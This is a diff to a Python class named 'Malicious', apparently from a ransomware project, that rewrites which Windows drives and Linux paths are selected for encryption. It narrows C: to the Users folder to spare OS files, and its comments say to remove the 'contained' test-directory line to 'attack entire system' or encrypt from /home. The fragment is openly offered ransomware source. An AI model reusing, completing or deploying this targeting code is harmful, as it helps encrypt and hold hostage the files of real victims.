@@ -97,18 +97,25 @@ class Malicious:
     @property
     def windows(self):
         # The C: Partitions Should start from C:\\Windows\Users Not C: To prevent Encryption of OS Files
-        partitions = [drive + ":" for drive in drives]
-        partitions[2] = r"C:\\Windows\Users"  # To prevent Encryption of OS Files
+        
+        partitions = [f"{drive}:\\" for drive in drives]
         valid_partitions = []
+        
         for partition in partitions:
-            if os.path.isdir(partition):
-                valid_partitions.append(partition)
-        valid_partitions = ["contained"] # Change this to a Directory u want for Testing if To Encrypt Entire System Comment the Line
+            if partition.startswith(r"C:\\"):
+                drv = r"C:\\Users\\"
+            else:
+                drv = partition
+            
+            if os.path.isdir(drv):
+                valid_partitions.append(drv)
+                
+        valid_partitions = ["contained"] # comment This line to attack entire system
         return valid_partitions
 
     @property
     def linux(self):
-        path = "~/../
+        path = "~/../"
         path = "contained"  # Comment This Line To Encrypt from /home in linux
         # login = os.getlogin()
         # path = os.path.join(home, login)
